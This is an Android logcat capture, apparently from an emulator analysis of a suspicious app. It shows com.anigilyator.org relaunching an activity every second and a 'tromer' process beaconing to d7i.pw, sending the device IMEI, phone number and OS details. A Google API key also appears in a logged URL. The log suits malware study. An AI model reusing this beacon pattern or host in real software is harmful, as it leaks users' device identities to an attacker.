+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.197  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:55:18.198  2016  2604 E NetRec  : [130] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:55:18.198  2016  2604 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.198  2016  2604 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:55:18.198  2016  2604 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:55:18.198  2016  2604 W NetRec  : [130] amxc.a: No server tokens extracted.
+12-05 18:55:18.320  2016  2604 E Volley  : [130] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:55:18.322  2016  4785 W NetRec  : [223] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 1.
+12-05 18:55:18.324  2016  4785 I NetRec  : [223] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new refresh_scores_task refresh.
+12-05 18:55:18.327  2016  4785 I NetRec  : [223] NetRecChimeraGcmTaskService.a: Completed refresh_scores_task score refresh task in 139 ms, returning 1
+12-05 18:55:18.331  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:5 result: 3 elapsed_millis: 146 uptime_millis: 146 exec_start_elapsed_seconds: 581 [CONTEXT service_id=218 ]
+12-05 18:55:17.428  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:18.432  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:18.435  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:18.496  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:18.496  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:18.514  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.810ms
+12-05 18:55:18.514  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:19.425  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:19.427  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:19.487  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:19.487  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:19.518  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 19us total 4.819ms
+12-05 18:55:19.518  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:20.436  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:20.442  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:20.477  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:20.477  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:20.494  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.556ms
+12-05 18:55:20.494  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:21.390  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:21.390  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:21.408  6639  6676 I zygote  : Explicit concurrent copying GC freed 39251(1264KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 2.619ms
+12-05 18:55:21.408  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:21.420  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:21.421  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:22.335  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:22.335  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:22.354  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:22.356  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.479ms
+12-05 18:55:22.447  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:23.019  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:55:23.019  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:23.324  1641  1895 E memtrack: Couldn't load memtrack module
+12-05 18:55:23.324  1641  1895 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:23.350  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:23.351  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 13us total 3.455ms
+12-05 18:55:23.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:24.419  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:24.419  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:22.445  1641  1767 I chatty  : uid=1000(system) Binder:1641_3 identical 1 line
+12-05 18:55:23.439  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:24.425  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:24.427  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:24.445  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:24.446  6639  6676 I zygote  : Explicit concurrent copying GC freed 39847(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.398ms
+12-05 18:55:25.388  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:25.388  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:25.406  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:25.407  6639  6676 I zygote  : Explicit concurrent copying GC freed 39251(1264KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.652ms
+12-05 18:55:25.461  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:25.459  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:26.437  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:26.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:26.465  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:26.465  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:26.483  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:26.484  6639  6676 I zygote  : Explicit concurrent copying GC freed 39847(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 9us total 2.422ms
+12-05 18:55:27.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:27.486  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:27.486  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:27.502  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:27.503  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.452ms
+12-05 18:55:28.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:28.543  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:28.544  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:28.559  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:28.560  6639  6676 I zygote  : Explicit concurrent copying GC freed 39556(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 9us total 2.370ms
+12-05 18:55:29.482  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:29.482  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:29.529  6639  6676 I zygote  : Explicit concurrent copying GC freed 42979(1393KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1126KB/2MB, paused 22us total 3.710ms
+12-05 18:55:29.529  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:27.435  1641  1767 I chatty  : uid=1000(system) Binder:1641_3 identical 1 line
+12-05 18:55:28.435  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:30.701  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:30.703  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:30.733  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:31.058  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:30.732  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:31.432  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:31.433  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:31.554  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:31.554  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:31.569  6639  6676 I zygote  : Explicit concurrent copying GC freed 10027(386KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 8us total 2.125ms
+12-05 18:55:31.569  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:32.429  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:32.516  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:32.516  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:32.536  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.767ms
+12-05 18:55:32.536  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:33.197  2186  2186 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:55:33.198  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:55:33.198  2016  2016 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:55:33.198  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:33.235  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:55:33.235  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:33.426  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:33.439  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:55:33.439  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:33.461  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 2.674ms
+12-05 18:55:33.461  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:34.385  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:55:34.385  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:34.402  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:34.403  6639  6676 I zygote  : Explicit concurrent copying GC freed 39251(1264KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.245ms
+12-05 18:55:34.433  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:35.294  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:55:35.294  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:35.311  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:35.314  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.655ms
+12-05 18:55:35.421  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:36.197  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:55:36.197  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:36.213  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:36.215  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.560ms
+12-05 18:55:36.436  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:37.175  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:37.175  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:37.191  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:37.192  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1127KB/2MB, paused 8us total 2.204ms
+12-05 18:55:35.420  1641  1767 I chatty  : uid=1000(system) Binder:1641_3 identical 4 lines
+12-05 18:55:36.435  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:37.438  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:37.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:38.146  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:38.146  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:38.174  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:38.174  6639  6676 I zygote  : Explicit concurrent copying GC freed 39555(1296KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 13us total 3.633ms
+12-05 18:55:38.439  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:38.441  1440  1458 D hwcomposer: hw_composer sent 336 syncs in 60s
+12-05 18:55:39.303  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:39.303  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:39.323  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:39.324  6639  6676 I zygote  : Explicit concurrent copying GC freed 39550(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 9us total 2.368ms
+12-05 18:55:39.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:40.289  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:40.289  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:40.306  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:40.307  6639  6676 I zygote  : Explicit concurrent copying GC freed 39561(1296KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 10us total 2.566ms
+12-05 18:55:40.431  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:41.258  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:41.258  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:41.276  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 9us total 2.560ms
+12-05 18:55:41.276  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:41.421  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:42.207  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:42.207  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:42.222  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:42.224  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 8us total 2.191ms
+12-05 18:55:40.430  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 3 lines
+12-05 18:55:41.420  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:42.436  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:42.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:43.157  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:43.157  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:43.178  6639  6676 I zygote  : Explicit concurrent copying GC freed 39549(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 10us total 3.222ms
+12-05 18:55:43.178  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:43.432  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:44.093  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:44.093  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:44.113  6639  6676 I zygote  : Explicit concurrent copying GC freed 39544(1280KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1111KB/2MB, paused 11us total 3.036ms
+12-05 18:55:44.113  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:44.802  2016  7094 E memtrack: Couldn't load memtrack module
+12-05 18:55:44.802  2016  7094 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:45.447  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:43.431  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:45.854  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:45.855  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:45.880  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:45.942  2186  7098 E memtrack: Couldn't load memtrack module
+12-05 18:55:45.942  2186  7098 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:46.303  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:46.304  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:46.322  6639  6676 I zygote  : Explicit concurrent copying GC freed 13498(516KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1112KB/2MB, paused 10us total 2.741ms
+12-05 18:55:46.323  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:46.439  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:47.314  1641  1767 E memtrack: Couldn't load memtrack module
+12-05 18:55:47.314  1641  1767 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:55:47.341  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:47.342  6639  6676 I zygote  : Explicit concurrent copying GC freed 39640(1281KB) AllocSpace objects, 1(20KB) LOS objects, 57% free, 1143KB/2MB, paused 12us total 3.378ms
+12-05 18:55:47.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:46.438  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 2 lines
+12-05 18:55:47.436  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:48.434  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:48.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:48.811  1447  1447 I boot-pipe: done populating /dev/random
+12-05 18:55:49.436  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:49.439  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:50.437  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:51.436  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:52.435  1641  2950 I chatty  : uid=1000(system) Binder:1641_E identical 1 line
+12-05 18:55:53.443  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:54.436  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:55:57.439  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 8 lines
+12-05 18:55:58.445  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:55:59.474  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:55:59.686  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:00.102  5398  6090 I Dialer  : OmtpVvmCarrierCfgHlpr - OmtpEvent:CONFIG_STATUS_SMS_TIME_OUT
+12-05 18:56:00.102  5398  5398 I Dialer  : RetryPolicy - discarding deferred status: configuration_state=4
+12-05 18:56:00.103  5398  5398 I Dialer  : VvmTaskExecutor - no more tasks, stopping service if no task are added in 5000 millis
+12-05 18:56:00.111  5398  5398 I Dialer  : VvmTaskReceiver - task received
+12-05 18:56:00.112  5398  5398 I Dialer  : VvmTaskReceiver - TaskExecutor already running
+12-05 18:56:00.112  5398  5398 I Dialer  : Task.createTask - create task:com.android.voicemail.impl.ActivationTask
+12-05 18:56:00.113  5398  5398 I Dialer  : RetryPolicy - retry #3 for com.android.voicemail.impl.ActivationTask@7262ff2 queued, executing in 5000
+12-05 18:56:00.113  5398  5398 I Dialer  : VvmTaskExecutor - com.android.voicemail.impl.ActivationTask@7262ff2 added
+12-05 18:56:00.113  5398  5398 I Dialer  : VvmTaskExecutor - minimal wait time:5000
+12-05 18:56:00.114  5398  5398 I Dialer  : VvmTaskExecutor - sleep for 5000 millis
+12-05 18:56:00.440  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:01.435  6099  6099 D tromer  : started
+12-05 18:56:01.437  1641  1895 I WifiService: acquireWifiLock uid=10402 lockMode=1
+12-05 18:56:01.439  6099  7111 D tromer  : state : null
+12-05 18:56:01.439  6099  7111 D tromer  : http://d7i.pw/o.php?a=1&b=358240051111110&c=Android&d=us&e=+15555215554&f=0.3.300&g=8.1.0&prefix=core_2
+12-05 18:55:59.685  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 5 lines
+12-05 18:56:00.436  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:01.445  1641  1767 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:01.447  6099  7111 W System.err: java.net.UnknownHostException: Unable to resolve host "d7i.pw": No address associated with hostname
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.net.Inet6AddressImpl.lookupHostByName(Inet6AddressImpl.java:141)
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.net.Inet6AddressImpl.lookupAllHostAddr(Inet6AddressImpl.java:90)
